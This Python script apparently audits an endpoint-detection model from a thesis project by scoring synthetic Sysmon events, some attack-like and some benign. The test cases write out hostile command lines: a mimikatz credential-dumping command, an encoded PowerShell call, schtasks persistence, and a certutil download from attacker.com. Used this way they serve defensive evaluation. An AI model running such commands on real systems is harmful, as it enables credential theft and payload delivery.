"""Run the failure-mode probe on iteration 3 (lgbm_xt_stratified_no_st,
AUC=0.9999, XT, 2990 trees). This is the audit we should have done at
the time."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from model_loader import FrozenModel
from feature_row import build_feature_row

MODEL = Path("J:/THESIS-EDR/server/ml-engine/botsv2/models/lgbm_xt_stratified_no_st")
m = FrozenModel(MODEL)
print(f"== ITERATION 3 (XT, AUC=0.9999, 2990 trees, only sourcetype dropped) ==")
print(f"threshold={m.threshold:.3f}  n_features={len(m.feature_names)}\n")


def sysmon(host, eid, kvs):
    parts = [f"<Event><System><EventID>{eid}</EventID><Computer>{host}</Computer></System><EventData>"]
    for k, v in kvs.items():
        parts.append(f"<Data Name='{k}'>{v}</Data>")
    parts.append("</EventData></Event>")
    return "".join(parts)


def mk(host, eid, kvs, edge="WRITE", obj="FILE"):
    return {"raw_event": sysmon(host, eid, kvs),
            "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
            "edge_type": edge, "subject": {"node_type": "PROCESS"},
            "object": {"node_type": obj}, "endpoint_id": host, "properties": {}}


cases = [
    ("T1 powershell -enc (Mordor vocab)",
     mk("alice-pc", 1, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell -enc SQBFAFgA"}, "FORK", "PROCESS")),
    ("T1 mimikatz (Mordor vocab)",
     mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Tools\mimikatz.exe",
        "CommandLine": "mimikatz sekurlsa::logonpasswords"}, "FORK", "PROCESS")),
    ("T1 .crypt write (both vocab)",
     mk("finance", 11, {"ProcessId": "100",
        "TargetFilename": r"C:\Users\acct\Q3.xlsx.crypt"}, "WRITE")),
    ("T1 winsys32.dll drop (BOTSv2 vocab)",
     mk("corp", 11, {"ProcessId": "100",
        "TargetFilename": r"C:\Windows\System32\winsys32.dll"}, "WRITE")),
    ("T2 .locked NOVEL extension",
     mk("hr-pc", 11, {"ProcessId": "100",
        "TargetFilename": r"C:\Users\hr\report.pdf.locked"}, "WRITE")),
    ("T2 .encrypted NOVEL extension",
     mk("hr-pc", 11, {"ProcessId": "100",
        "TargetFilename": r"C:\Users\hr\contract.encrypted"}, "WRITE")),
    ("T2 CobaltStrike beacon.exe NOVEL",
     mk("eng-pc", 11, {"ProcessId": "100", "Image": r"C:\Temp\dropper.exe",
        "TargetFilename": r"C:\Users\eng\AppData\Roaming\beacon.exe"}, "WRITE")),
    ("T2 schtasks /create persistence NOVEL",
     mk("alice-pc", 1, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": 'schtasks /create /sc minute /tn evil /tr c:\\bad.exe'}, "FORK", "PROCESS")),
    ("T2 certutil download NOVEL (LOLBin)",
     mk("alice-pc", 1, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil -urlcache -split -f http://attacker.com/x.exe c:\\x.exe"}, "FORK", "PROCESS")),
    ("T3 BENIGN Visual Studio devenv",
     mk("dev-pc", 1, {"ProcessId": "100",
        "Image": r"C:\Program Files\Microsoft Visual Studio\IDE\devenv.exe",
        "CommandLine": "devenv /run project.sln"}, "FORK", "PROCESS")),
    ("T3 BENIGN Windows Update svchost",
     mk("any", 1, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\svchost.exe",
        "CommandLine": "svchost -k netsvcs -p -s wuauserv"}, "FORK", "PROCESS")),
    ("T3 BENIGN Word saves .docx",
     mk("alice-pc", 11, {"ProcessId": "100",
        "Image": r"C:\Office\WINWORD.EXE",
        "TargetFilename": r"C:\Users\alice\notes.docx"}, "WRITE")),
    ("T3 BENIGN notepad .txt",
     mk("alice-pc", 11, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\notepad.exe",
        "TargetFilename": r"C:\Users\alice\todo.txt"}, "WRITE")),
    ("T3 BENIGN chrome renderer",
     mk("alice-pc", 1, {"ProcessId": "100", "Image": r"C:\Chrome\chrome.exe",
        "CommandLine": "chrome --type=renderer"}, "FORK", "PROCESS")),
    ("T5 OOD Sysmon EID=22 DNS",
     mk("alice-pc", 22, {"ProcessId": "100",
        "Image": r"C:\Chrome\chrome.exe"}, "ACCESS", "Url")),
    ("T5 OOD Sysmon EID=3 net",
     mk("alice-pc", 3, {"ProcessId": "100",
        "Image": r"C:\Windows\System32\svchost.exe",
        "DestinationIp": "8.8.8.8", "DestinationPort": "53"}, "CONNECT", "Socket")),
]

print(f"{'case':<48} {'score':>8} {'verdict':>8}")
print("-" * 70)
for lbl, ev in cases:
    row, _ = build_feature_row(ev)
    s = m.predict_proba(row)
    v = "ALERT" if s >= m.threshold else "benign"
    print(f"{lbl:<48} {s:>8.4f} {v:>8}")
